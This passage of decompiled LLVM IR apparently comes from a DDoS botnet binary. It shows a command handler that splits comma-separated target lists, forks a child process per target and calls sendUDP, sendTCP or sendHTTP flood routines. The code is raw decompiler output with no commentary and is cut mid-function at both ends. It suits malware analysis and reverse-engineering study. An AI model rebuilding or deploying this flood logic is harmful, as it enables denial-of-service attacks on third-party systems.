  br i1 %v7_804eeea, label %dec_label_pc_804eeec, label %dec_label_pc_804ef12

dec_label_pc_804eeec:                             ; preds = %dec_label_pc_804eedd
  %v1_804eeef = add i32 %tmp188, 32
  %v1_804eef2 = inttoptr i32 %v1_804eeef to i32*
  %v2_804eef2 = load i32, i32* %v1_804eef2, align 4
  store i1 %v5_804ed42, i1* %cf.global-to-local, align 1
  store i32 %v2_804eef2, i32* %stack_var_-380, align 4
  %v1_804eef8 = call i32 @atol(i32 %v2_804eef2)
  %v0_804eefd = load i32, i32* @esp, align 4
  %v2_804eefd = icmp ugt i32 %v0_804eefd, -17
  store i1 %v2_804eefd, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804ef12

dec_label_pc_804ef12:                             ; preds = %dec_label_pc_804eedd.thread, %dec_label_pc_804eedd, %dec_label_pc_804eeec
  %storemerge38231 = phi i32 [ %v1_804eec3, %dec_label_pc_804eeec ], [ %v1_804eec3, %dec_label_pc_804eedd ], [ 1000000, %dec_label_pc_804eedd.thread ]
  %storemerge39226230 = phi i32 [ %v1_804ee8e, %dec_label_pc_804eeec ], [ %v1_804ee8e, %dec_label_pc_804eedd ], [ %storemerge39226.ph, %dec_label_pc_804eedd.thread ]
  %storemerge37 = phi i32 [ %v1_804eef8, %dec_label_pc_804eeec ], [ 0, %dec_label_pc_804eedd ], [ 0, %dec_label_pc_804eedd.thread ]
  %v5_804ef1e = icmp ult i32* %stack_var_-364, inttoptr (i32 8 to i32*)
  store i1 %v5_804ef1e, i1* %cf.global-to-local, align 1
  store i32 %v2_804ee1b, i32* %stack_var_-380, align 4
  %v2_804ef24 = inttoptr i32 %v2_804ee1b to i8*
  %v3_804ef24 = call i32 @__GI_strchr(i8* %v2_804ef24, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ef2c = icmp eq i32 %v3_804ef24, 0
  br i1 %v1_804ef2c, label %dec_label_pc_804ef9c, label %dec_label_pc_804ef30

dec_label_pc_804ef30:                             ; preds = %dec_label_pc_804ef12
  store i32 %v2_804ee1b, i32* @eax, align 4
  store i1 %v5_804ef1e, i1* %cf.global-to-local, align 1
  store i32 %v2_804ee1b, i32* %stack_var_-380, align 4
  %v2_804ef3c = call i32 @__GI_strtok(i32 %v2_804ee1b, i32 ptrtoint (i32* @global_var_8058c11.306 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804ef91253 = icmp eq i32 %v2_804ef3c, 0
  %v1_804ef95254 = icmp eq i1 %v4_804ef91253, false
  br i1 %v1_804ef95254, label %dec_label_pc_804ef49, label %dec_label_pc_804f9cf

dec_label_pc_804ef49:                             ; preds = %dec_label_pc_804ef30, %dec_label_pc_804ef7c
  %storemerge101255 = phi i32 [ %v2_804ef86, %dec_label_pc_804ef7c ], [ %v2_804ef3c, %dec_label_pc_804ef30 ]
  %v0_804ef49 = call i32 @listFork()
  store i32 %v0_804ef49, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ef4e = icmp eq i32 %v0_804ef49, 0
  %v1_804ef50 = icmp eq i1 %v1_804ef4e, false
  br i1 %v1_804ef50, label %dec_label_pc_804ef7c, label %dec_label_pc_804ef52

dec_label_pc_804ef52:                             ; preds = %dec_label_pc_804ef49
  store i32 %v1_804ee71, i32* %stack_var_-380, align 4
  store i32 %storemerge101255, i32* %stack_var_-396, align 4
  %v8_804ef6a = call i32 @sendUDP(i32 %storemerge101255, i32 %v1_804ee2c, i32 %v1_804ee43, i32 %v1_804ee5a, i32 %v1_804ee71, i32 %storemerge39226230, i32 %storemerge38231, i32 %storemerge37)
  store i1 %v5_804ed42, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-380, align 4
  %v1_804ef77 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804ef7c:                             ; preds = %dec_label_pc_804ef49
  %v0_804ef7c = load i32, i32* @esp, align 4
  %v5_804ef7c = icmp ult i32 %v0_804ef7c, 8
  store i1 %v5_804ef7c, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-380, align 4
  %v2_804ef86 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_8058c11.306 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804ef91 = icmp eq i32 %v2_804ef86, 0
  %v1_804ef95 = icmp eq i1 %v4_804ef91, false
  br i1 %v1_804ef95, label %dec_label_pc_804ef49, label %dec_label_pc_804f9cf

dec_label_pc_804ef9c:                             ; preds = %dec_label_pc_804ef12
  %v0_804ef9c = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804efa1 = icmp eq i32 %v0_804ef9c, 0
  %v1_804efa3 = icmp eq i1 %v1_804efa1, false
  br i1 %v1_804efa3, label %dec_label_pc_804f9cf, label %dec_label_pc_804efa9

dec_label_pc_804efa9:                             ; preds = %dec_label_pc_804ef9c
  store i32 %v1_804ee71, i32* %stack_var_-380, align 4
  store i32 %v2_804ee1b, i32* %stack_var_-396, align 4
  %v8_804efc1 = call i32 @sendUDP(i32 %v2_804ee1b, i32 %v1_804ee2c, i32 %v1_804ee43, i32 %v1_804ee5a, i32 %v1_804ee71, i32 %storemerge39226230, i32 %storemerge38231, i32 %storemerge37)
  store i1 %v5_804ed42, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-380, align 4
  %v1_804efce = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804efd3:                             ; preds = %dec_label_pc_804ecc8
  %v2_804efd6 = load i32, i32* %v1_804e944, align 4
  store i1 false, i1* @df, align 1
  %v4_804eff3 = inttoptr i32 %v2_804efd6 to i8*
  store i32 %v2_804efd6, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805902d.430 to i32), i32* @edi, align 4
  %v7_804f005 = call i32 @_strncmp(i8* %v4_804eff3, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805902d.430, i32 0, i32 0), i32 4)
  %v8_804f005 = urem i32 %v7_804f005, 2
  %v9_804f005 = icmp eq i32 %v8_804f005, 0
  %v0_804f007 = load i1, i1* %cf.global-to-local, align 1
  %v2_804f007 = or i1 %v0_804f007, %v9_804f005
  %v3_804f007 = zext i1 %v2_804f007 to i32
  %v4_804f007 = load i32, i32* %edx.global-to-local, align 4
  %v5_804f007 = and i32 %v4_804f007, -256
  %v6_804f007 = or i32 %v3_804f007, %v5_804f007
  %v7_804f007 = xor i32 %v6_804f007, 1
  store i32 %v7_804f007, i32* @edx, align 4
  %v1_804f00f = trunc i32 %v7_804f007 to i8
  %v3_804f00f = zext i1 %v0_804f007 to i8
  %v15_804f00f = icmp eq i8 %v1_804f00f, %v3_804f00f
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f018 = icmp eq i1 %v15_804f00f, false
  br i1 %v1_804f018, label %dec_label_pc_804f25d, label %dec_label_pc_804f01e

dec_label_pc_804f01e:                             ; preds = %dec_label_pc_804efd3
  %v9_804f01e = icmp ult i32 %tmp160, 5
  store i1 %v9_804f01e, i1* %cf.global-to-local, align 1
  %v7_804f022 = icmp sgt i32 %tmp160, 5
  br i1 %v7_804f022, label %dec_label_pc_804f028, label %dec_label_pc_804f01e.dec_label_pc_804f0cc_crit_edge

dec_label_pc_804f01e.dec_label_pc_804f0cc_crit_edge: ; preds = %dec_label_pc_804f01e
  %v0_804f0d1.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804f0cc

dec_label_pc_804f028:                             ; preds = %dec_label_pc_804f01e
  %v1_804f02b = add i32 %tmp188, 12
  %v1_804f02e = inttoptr i32 %v1_804f02b to i32*
  %v2_804f02e = load i32, i32* %v1_804f02e, align 4
  %v0_804f030 = load i32, i32* @esp, align 4
  %v5_804f030 = icmp ult i32 %v0_804f030, 12
  store i1 %v5_804f030, i1* %cf.global-to-local, align 1
  store i32 %v2_804f02e, i32* %stack_var_-396, align 4
  %v1_804f034 = call i32 @atol(i32 %v2_804f02e)
  %v12_804f039 = ptrtoint i32* %stack_var_-380 to i32
  %v5_804f03c = icmp ne i32 %v1_804f034, -1
  store i1 %v5_804f03c, i1* %cf.global-to-local, align 1
  %v10_804f03c = icmp eq i32 %v1_804f034, -1
  br i1 %v10_804f03c, label %dec_label_pc_804f0cc, label %dec_label_pc_804f045

dec_label_pc_804f045:                             ; preds = %dec_label_pc_804f028
  %v1_804f048 = add i32 %tmp188, 8
  %v1_804f04b = inttoptr i32 %v1_804f048 to i32*
  %v2_804f04b = load i32, i32* %v1_804f04b, align 4
  %v5_804f04d = icmp ult i32* %stack_var_-380, inttoptr (i32 12 to i32*)
  store i1 %v5_804f04d, i1* %cf.global-to-local, align 1
  store i32 %v2_804f04b, i32* %stack_var_-396, align 4
  %v1_804f051 = call i32 @atol(i32 %v2_804f04b)
  %v5_804f059 = icmp ne i32 %v1_804f051, -1
  store i1 %v5_804f059, i1* %cf.global-to-local, align 1
  %v10_804f059 = icmp eq i32 %v1_804f051, -1
  br i1 %v10_804f059, label %dec_label_pc_804f0cc, label %dec_label_pc_804f05e

dec_label_pc_804f05e:                             ; preds = %dec_label_pc_804f045
  %v1_804f061 = add i32 %tmp188, 16
  %v1_804f064 = inttoptr i32 %v1_804f061 to i32*
  %v2_804f064 = load i32, i32* %v1_804f064, align 4
  store i1 %v5_804f04d, i1* %cf.global-to-local, align 1
  store i32 %v2_804f064, i32* %stack_var_-396, align 4
  %v1_804f06a = call i32 @atol(i32 %v2_804f064)
  %v5_804f072 = icmp ne i32 %v1_804f06a, -1
  store i1 %v5_804f072, i1* %cf.global-to-local, align 1
  %v10_804f072 = icmp eq i32 %v1_804f06a, -1
  br i1 %v10_804f072, label %dec_label_pc_804f0cc, label %dec_label_pc_804f077

dec_label_pc_804f077:                             ; preds = %dec_label_pc_804f05e
  %v2_804f07d = load i32, i32* %v1_804f064, align 4
  store i1 %v5_804f04d, i1* %cf.global-to-local, align 1
  store i32 %v2_804f07d, i32* %stack_var_-396, align 4
  %v1_804f083 = call i32 @atol(i32 %v2_804f07d)
  %v1_804f08b = add i32 %v1_804f083, -32
  %v2_804f08b = icmp ult i32 %v1_804f083, 32
  %v3_804f08b = sub i32 31, %v1_804f083
  %v4_804f08b = and i32 %v3_804f08b, %v1_804f083
  %v5_804f08b = icmp slt i32 %v4_804f08b, 0
  store i1 %v2_804f08b, i1* %cf.global-to-local, align 1
  %v6_804f08b = icmp eq i32 %v1_804f08b, 0
  %v7_804f08b = icmp slt i32 %v1_804f08b, 0
  %v3_804f08e = icmp eq i1 %v7_804f08b, %v5_804f08b
  %v4_804f08e = icmp eq i1 %v6_804f08b, false
  %v5_804f08e = and i1 %v4_804f08e, %v3_804f08e
  br i1 %v5_804f08e, label %dec_label_pc_804f0cc, label %dec_label_pc_804f090

dec_label_pc_804f090:                             ; preds = %dec_label_pc_804f077
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804f094 = icmp sgt i32 %tmp160, 6
  br i1 %v7_804f094, label %dec_label_pc_804f096, label %dec_label_pc_804f0ae.thread

dec_label_pc_804f0ae.thread:                      ; preds = %dec_label_pc_804f090
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804f0e7

dec_label_pc_804f096:                             ; preds = %dec_label_pc_804f090
  %v1_804f099 = add i32 %tmp188, 24
  %v1_804f09c = inttoptr i32 %v1_804f099 to i32*
  %v2_804f09c = load i32, i32* %v1_804f09c, align 4
  store i1 %v5_804f04d, i1* %cf.global-to-local, align 1
  store i32 %v2_804f09c, i32* %stack_var_-396, align 4
  %v1_804f0a2 = call i32 @atol(i32 %v2_804f09c)
  store i1 false, i1* %cf.global-to-local, align 1
  %v2_804f0aa = icmp slt i32 %v1_804f0a2, 0
  br i1 %v2_804f0aa, label %dec_label_pc_804f0cc, label %dec_label_pc_804f0ae

dec_label_pc_804f0ae:                             ; preds = %dec_label_pc_804f096
  %v8_804f0ae = icmp ult i32 %tmp160, 8
  store i1 %v8_804f0ae, i1* %cf.global-to-local, align 1
  %v12_804f0ae = icmp eq i32 %tmp160, 8
  %v1_804f0b2 = icmp eq i1 %v12_804f0ae, false
  br i1 %v1_804f0b2, label %dec_label_pc_804f0e7, label %dec_label_pc_804f0b4

dec_label_pc_804f0b4:                             ; preds = %dec_label_pc_804f0ae
  %v1_804f0b7 = add i32 %tmp188, 28
  %v1_804f0ba = inttoptr i32 %v1_804f0b7 to i32*
  %v2_804f0ba = load i32, i32* %v1_804f0ba, align 4
  store i1 %v5_804f04d, i1* %cf.global-to-local, align 1
  store i32 %v2_804f0ba, i32* %stack_var_-396, align 4
  %v1_804f0c0 = call i32 @atol(i32 %v2_804f0ba)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp213 = icmp slt i32 %v1_804f0c0, 1
  %tmp214 = icmp eq i1 %tmp213, false
  br i1 %tmp214, label %dec_label_pc_804f0e7, label %dec_label_pc_804f0cc

dec_label_pc_804f0cc:                             ; preds = %dec_label_pc_804f01e.dec_label_pc_804f0cc_crit_edge, %dec_label_pc_804f0b4, %dec_label_pc_804f096, %dec_label_pc_804f077, %dec_label_pc_804f05e, %dec_label_pc_804f045, %dec_label_pc_804f028
  %v0_804f0d1 = phi i32 [ %v0_804f0d1.pre, %dec_label_pc_804f01e.dec_label_pc_804f0cc_crit_edge ], [ %v12_804f039, %dec_label_pc_804f0b4 ], [ %v12_804f039, %dec_label_pc_804f096 ], [ %v12_804f039, %dec_label_pc_804f077 ], [ %v12_804f039, %dec_label_pc_804f05e ], [ %v12_804f039, %dec_label_pc_804f045 ], [ %v12_804f039, %dec_label_pc_804f028 ]
  %v0_804f0cc = load i32, i32* @global_var_805b520.20, align 32
  %v5_804f0d1 = icmp ult i32 %v0_804f0d1, 8
  store i1 %v5_804f0d1, i1* %cf.global-to-local, align 1
  store i32 %v0_804f0cc, i32* %stack_var_-396, align 4
  %v2_804f0da = call i32 @sockprintf(i32 %v0_804f0cc, i32 ptrtoint ([186 x i8]* @global_var_8059034.431 to i32))
  %v0_804f0df = load i32, i32* @esp, align 4
  %v2_804f0df = icmp ugt i32 %v0_804f0df, -17
  store i1 %v2_804f0df, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804f9cf

dec_label_pc_804f0e7:                             ; preds = %dec_label_pc_804f0ae.thread, %dec_label_pc_804f0b4, %dec_label_pc_804f0ae
  %v8_804f0ae235 = phi i1 [ true, %dec_label_pc_804f0ae.thread ], [ %v8_804f0ae, %dec_label_pc_804f0b4 ], [ %v8_804f0ae, %dec_label_pc_804f0ae ]
  %v1_804f0b2237 = phi i1 [ true, %dec_label_pc_804f0ae.thread ], [ false, %dec_label_pc_804f0b4 ], [ true, %dec_label_pc_804f0ae ]
  %v1_804f0ea = add i32 %tmp188, 4
  %v1_804f0ed = inttoptr i32 %v1_804f0ea to i32*
  %v2_804f0ed = load i32, i32* %v1_804f0ed, align 4
  %v2_804f0f8 = load i32, i32* %v1_804f04b, align 4
  store i1 %v5_804f04d, i1* %cf.global-to-local, align 1
  store i32 %v2_804f0f8, i32* %stack_var_-396, align 4
  %v1_804f0fe = call i32 @atol(i32 %v2_804f0f8)
  %v2_804f10f = load i32, i32* %v1_804f02e, align 4
  store i1 %v5_804f04d, i1* %cf.global-to-local, align 1
  store i32 %v2_804f10f, i32* %stack_var_-396, align 4
  %v1_804f115 = call i32 @atol(i32 %v2_804f10f)
  %v2_804f126 = load i32, i32* %v1_804f064, align 4
  store i1 %v5_804f04d, i1* %cf.global-to-local, align 1
  store i32 %v2_804f126, i32* %stack_var_-396, align 4
  %v1_804f12c = call i32 @atol(i32 %v2_804f126)
  %v1_804f13a = add i32 %tmp188, 20
  %v1_804f13d = inttoptr i32 %v1_804f13a to i32*
  %v2_804f13d = load i32, i32* %v1_804f13d, align 4
  store i1 %v8_804f0ae235, i1* %cf.global-to-local, align 1
  br i1 %v1_804f0b2237, label %dec_label_pc_804f16e, label %dec_label_pc_804f148

dec_label_pc_804f148:                             ; preds = %dec_label_pc_804f0e7
  %v1_804f14b = add i32 %tmp188, 28
  %v1_804f14e = inttoptr i32 %v1_804f14b to i32*
  %v2_804f14e = load i32, i32* %v1_804f14e, align 4
  store i1 %v5_804f04d, i1* %cf.global-to-local, align 1
  store i32 %v2_804f14e, i32* %stack_var_-396, align 4
  %v1_804f154 = call i32 @atol(i32 %v2_804f14e)
  %v0_804f159 = load i32, i32* @esp, align 4
  %v2_804f159 = icmp ugt i32 %v0_804f159, -17
  store i1 %v2_804f159, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804f16e

dec_label_pc_804f16e:                             ; preds = %dec_label_pc_804f0e7, %dec_label_pc_804f148
  %storemerge36 = phi i32 [ %v1_804f154, %dec_label_pc_804f148 ], [ 10, %dec_label_pc_804f0e7 ]
  store i32 %storemerge36, i32* @esi, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v7_804f094, label %dec_label_pc_804f17d, label %dec_label_pc_804f1a3

dec_label_pc_804f17d:                             ; preds = %dec_label_pc_804f16e
  %v1_804f180 = add i32 %tmp188, 24
  %v1_804f183 = inttoptr i32 %v1_804f180 to i32*
  %v2_804f183 = load i32, i32* %v1_804f183, align 4
  store i1 %v5_804f04d, i1* %cf.global-to-local, align 1
  store i32 %v2_804f183, i32* %stack_var_-396, align 4
  %v1_804f189 = call i32 @atol(i32 %v2_804f183)
  %v0_804f18e = load i32, i32* @esp, align 4
  %v2_804f18e = icmp ugt i32 %v0_804f18e, -17
  store i1 %v2_804f18e, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804f1a3

dec_label_pc_804f1a3:                             ; preds = %dec_label_pc_804f16e, %dec_label_pc_804f17d
  %storemerge35 = phi i32 [ %v1_804f189, %dec_label_pc_804f17d ], [ 0, %dec_label_pc_804f16e ]
  store i32 %storemerge35, i32* @edi, align 4
  %v5_804f1af = icmp ult i32* %stack_var_-380, inttoptr (i32 8 to i32*)
  store i1 %v5_804f1af, i1* %cf.global-to-local, align 1
  store i32 %v2_804f0ed, i32* %stack_var_-396, align 4
  %v2_804f1b5 = inttoptr i32 %v2_804f0ed to i8*
  %v3_804f1b5 = call i32 @__GI_strchr(i8* %v2_804f1b5, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f1bd = icmp eq i32 %v3_804f1b5, 0
  br i1 %v1_804f1bd, label %dec_label_pc_804f22a, label %dec_label_pc_804f1c1

dec_label_pc_804f1c1:                             ; preds = %dec_label_pc_804f1a3
  store i32 %v2_804f0ed, i32* @eax, align 4
  store i1 %v5_804f1af, i1* %cf.global-to-local, align 1
  store i32 %v2_804f0ed, i32* %stack_var_-396, align 4
  %v2_804f1cd = call i32 @__GI_strtok(i32 %v2_804f0ed, i32 ptrtoint (i32* @global_var_8058c11.306 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f222250 = icmp eq i32 %v2_804f1cd, 0
  %v1_804f226251 = icmp eq i1 %v4_804f222250, false
  br i1 %v1_804f226251, label %dec_label_pc_804f1da, label %dec_label_pc_804f25d

dec_label_pc_804f1da:                             ; preds = %dec_label_pc_804f1c1, %dec_label_pc_804f20d
  %storemerge34252 = phi i32 [ %v2_804f217, %dec_label_pc_804f20d ], [ %v2_804f1cd, %dec_label_pc_804f1c1 ]
  %v0_804f1da = call i32 @listFork()
  store i32 %v0_804f1da, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f1df = icmp eq i32 %v0_804f1da, 0
  %v1_804f1e1 = icmp eq i1 %v1_804f1df, false
  %v0_804f20d = load i32, i32* @esp, align 4
  br i1 %v1_804f1e1, label %dec_label_pc_804f20d, label %dec_label_pc_804f1e3

dec_label_pc_804f1e3:                             ; preds = %dec_label_pc_804f1da
  %v5_804f1e3 = icmp ult i32 %v0_804f20d, 4
  store i1 %v5_804f1e3, i1* %cf.global-to-local, align 1
  store i32 %v2_804f13d, i32* %stack_var_-396, align 4
  %v7_804f1fb = inttoptr i32 %v2_804f13d to i8*
  %v8_804f1fb = call i32 @sendTCP(i32 %storemerge34252, i32 %v1_804f0fe, i32 %v1_804f115, i32 %v1_804f12c, i8* %v7_804f1fb, i32 %storemerge35, i32 %storemerge36)
  store i1 %v5_804f04d, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-396, align 4
  %v1_804f208 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804f20d:                             ; preds = %dec_label_pc_804f1da
  %v5_804f20d = icmp ult i32 %v0_804f20d, 8
  store i1 %v5_804f20d, i1* %cf.global-to-local, align 1
  %v2_804f217 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_8058c11.306 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f222 = icmp eq i32 %v2_804f217, 0
  %v1_804f226 = icmp eq i1 %v4_804f222, false
  br i1 %v1_804f226, label %dec_label_pc_804f1da, label %dec_label_pc_804f25d

dec_label_pc_804f22a:                             ; preds = %dec_label_pc_804f1a3
  %v0_804f22a = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f22f = icmp eq i32 %v0_804f22a, 0
  %v1_804f231 = icmp eq i1 %v1_804f22f, false
  br i1 %v1_804f231, label %dec_label_pc_804f25d, label %dec_label_pc_804f233

dec_label_pc_804f233:                             ; preds = %dec_label_pc_804f22a
  %v0_804f233 = load i32, i32* @esp, align 4
  %v5_804f233 = icmp ult i32 %v0_804f233, 4
  store i1 %v5_804f233, i1* %cf.global-to-local, align 1
  store i32 %v2_804f13d, i32* %stack_var_-396, align 4
  %v7_804f24b = inttoptr i32 %v2_804f13d to i8*
  %v8_804f24b = call i32 @sendTCP(i32 %v2_804f0ed, i32 %v1_804f0fe, i32 %v1_804f115, i32 %v1_804f12c, i8* %v7_804f24b, i32 %storemerge35, i32 %storemerge36)
  store i1 %v5_804f04d, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-396, align 4
  %v1_804f258 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804f25d:                             ; preds = %dec_label_pc_804f1c1, %dec_label_pc_804f20d, %dec_label_pc_804f22a, %dec_label_pc_804efd3
  %v2_804f260 = load i32, i32* %v1_804e944, align 4
  store i1 false, i1* @df, align 1
  %v4_804f27d = inttoptr i32 %v2_804f260 to i8*
  store i32 %v2_804f260, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_80590ee.432 to i32), i32* @edi, align 4
  %v7_804f28f = call i32 @_strncmp(i8* %v4_804f27d, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80590ee.432, i32 0, i32 0), i32 5)
  %v8_804f28f = urem i32 %v7_804f28f, 2
  %v9_804f28f = icmp eq i32 %v8_804f28f, 0
  %v0_804f291 = load i1, i1* %cf.global-to-local, align 1
  %v2_804f291 = or i1 %v0_804f291, %v9_804f28f
  %v3_804f291 = zext i1 %v2_804f291 to i32
  %v4_804f291 = load i32, i32* @edx, align 4
  %v5_804f291 = and i32 %v4_804f291, -256
  %v6_804f291 = or i32 %v3_804f291, %v5_804f291
  %v7_804f291 = xor i32 %v6_804f291, 1
  store i32 %v7_804f291, i32* @edx, align 4
  %v3_804f297 = and i32 %v7_804f28f, -256
  %v1_804f299 = trunc i32 %v7_804f291 to i8
  %v3_804f299 = zext i1 %v0_804f291 to i8
  %v4_804f299 = sub nsw i8 %v1_804f299, %v3_804f299
  %v15_804f299 = icmp eq i8 %v4_804f299, 0
  %v20_804f299 = zext i8 %v4_804f299 to i32
  %v23_804f299 = or i32 %v20_804f299, %v3_804f297
  store i32 %v23_804f299, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f2a2 = icmp eq i1 %v15_804f299, false
  br i1 %v1_804f2a2, label %dec_label_pc_804f429, label %dec_label_pc_804f2a8

dec_label_pc_804f2a8:                             ; preds = %dec_label_pc_804f25d
  %v2_804f29d = sext i8 %v4_804f299 to i32
  %v9_804f2a8 = icmp ult i32 %tmp160, 5
  store i1 %v9_804f2a8, i1* %cf.global-to-local, align 1
  %v7_804f2ac = icmp sgt i32 %tmp160, 5
  br i1 %v7_804f2ac, label %dec_label_pc_804f2b2, label %dec_label_pc_804f9cf

dec_label_pc_804f2b2:                             ; preds = %dec_label_pc_804f2a8
  %v1_804f2b5 = add i32 %tmp188, 4
  %v1_804f2b8 = inttoptr i32 %v1_804f2b5 to i32*
  %v2_804f2b8 = load i32, i32* %v1_804f2b8, align 4
  %v0_804f2ba = load i32, i32* @esp, align 4
  %v5_804f2ba = icmp ult i32 %v0_804f2ba, 8
  store i1 %v5_804f2ba, i1* %cf.global-to-local, align 1
  store i32 %v2_804f2b8, i32* %stack_var_-380, align 4
  %v2_804f2c0 = inttoptr i32 %v2_804f2b8 to i8*
  %v3_804f2c0 = call i32 @__GI_strchr(i8* %v2_804f2c0, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f2c8 = icmp eq i32 %v3_804f2c0, 0
  br i1 %v1_804f2c8, label %dec_label_pc_804f39d, label %dec_label_pc_804f2d0

dec_label_pc_804f2d0:                             ; preds = %dec_label_pc_804f2b2
  %v2_804f2d6 = load i32, i32* %v1_804f2b8, align 4
  store i32 %v2_804f2d6, i32* @eax, align 4
  %v5_804f2d8 = icmp ult i32* %stack_var_-364, inttoptr (i32 8 to i32*)
  store i1 %v5_804f2d8, i1* %cf.global-to-local, align 1
  store i32 %v2_804f2d6, i32* %stack_var_-380, align 4
  %v2_804f2e1 = call i32 @__GI_strtok(i32 %v2_804f2d6, i32 ptrtoint (i32* @global_var_8058c11.306 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f38e248 = icmp eq i32 %v2_804f2e1, 0
  %v1_804f392249 = icmp eq i1 %v4_804f38e248, false
  br i1 %v1_804f392249, label %dec_label_pc_804f2f1, label %dec_label_pc_804f429

dec_label_pc_804f2f1:                             ; preds = %dec_label_pc_804f2d0, %dec_label_pc_804f379
  %v0_804f2f1 = call i32 @listFork()
  store i32 %v0_804f2f1, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f2f6 = icmp eq i32 %v0_804f2f1, 0
  %v1_804f2f8 = icmp eq i1 %v1_804f2f6, false
  br i1 %v1_804f2f8, label %dec_label_pc_804f379, label %dec_label_pc_804f2fa

dec_label_pc_804f2fa:                             ; preds = %dec_label_pc_804f2f1
  %v1_804f2fd = add i32 %tmp188, 24
  %v1_804f300 = inttoptr i32 %v1_804f2fd to i32*
  %v2_804f300 = load i32, i32* %v1_804f300, align 4
  %v0_804f302 = load i32, i32* @esp, align 4
  %v5_804f302 = icmp ult i32 %v0_804f302, 12
  store i1 %v5_804f302, i1* %cf.global-to-local, align 1
  store i32 %v2_804f300, i32* %stack_var_-380, align 4
  %v1_804f306 = call i32 @atol(i32 %v2_804f300)
  store i32 %v1_804f306, i32* @ebx, align 4
  %v1_804f313 = add i32 %tmp188, 20
  %v1_804f316 = inttoptr i32 %v1_804f313 to i32*
  %v2_804f316 = load i32, i32* %v1_804f316, align 4
  %v5_804f318 = icmp ult i32* %stack_var_-364, inttoptr (i32 12 to i32*)
  store i1 %v5_804f318, i1* %cf.global-to-local, align 1
  store i32 %v2_804f316, i32* %stack_var_-380, align 4
  %v1_804f31c = call i32 @atol(i32 %v2_804f316)
  store i32 %v1_804f31c, i32* @esi, align 4
  %v1_804f329 = add i32 %tmp188, 16
  %v1_804f32c = inttoptr i32 %v1_804f329 to i32*
  %v2_804f32c = load i32, i32* %v1_804f32c, align 4
  store i32 %v2_804f32c, i32* @edi, align 4
  %v1_804f333 = add i32 %tmp188, 12
  %v1_804f336 = inttoptr i32 %v1_804f333 to i32*
  %v2_804f336 = load i32, i32* %v1_804f336, align 4
  store i1 %v5_804f318, i1* %cf.global-to-local, align 1
  store i32 %v2_804f336, i32* %stack_var_-380, align 4
  %v1_804f33c = call i32 @atol(i32 %v2_804f336)
  %v1_804f34f = add i32 %tmp188, 8
  %v1_804f352 = inttoptr i32 %v1_804f34f to i32*
  %v2_804f352 = load i32, i32* %v1_804f352, align 4
  store i32 %v2_804f352, i32* %edx.global-to-local, align 4
  %v2_804f35c = load i32, i32* %v1_804f2b8, align 4
  store i1 %v5_804f2d8, i1* %cf.global-to-local, align 1
  %v0_804f361 = load i32, i32* @ebx, align 4
  %v0_804f362 = load i32, i32* @esi, align 4
  store i32 %v0_804f362, i32* %stack_var_-380, align 4
  %v0_804f363 = load i32, i32* @edi, align 4
  store i32 %v2_804f35c, i32* %stack_var_-396, align 4
  %v6_804f367 = trunc i32 %v1_804f33c to i16
  %v7_804f367 = call i32 @sendHTTP(i32 %v2_804f35c, i32 %v2_804f352, i16 %v6_804f367, i32 %v0_804f363, i32 %v0_804f362, i32 %v0_804f361)
  store i1 %v5_804f318, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-380, align 4
  %v1_804f374 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804f379:                             ; preds = %dec_label_pc_804f2f1
  %v0_804f379 = load i32, i32* @esp, align 4
  %v5_804f379 = icmp ult i32 %v0_804f379, 8
  store i1 %v5_804f379, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-380, align 4
  %v2_804f383 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_8058c11.306 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f38e = icmp eq i32 %v2_804f383, 0
  %v1_804f392 = icmp eq i1 %v4_804f38e, false
  br i1 %v1_804f392, label %dec_label_pc_804f2f1, label %dec_label_pc_804f429

dec_label_pc_804f39d:                             ; preds = %dec_label_pc_804f2b2
  %v0_804f39d = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
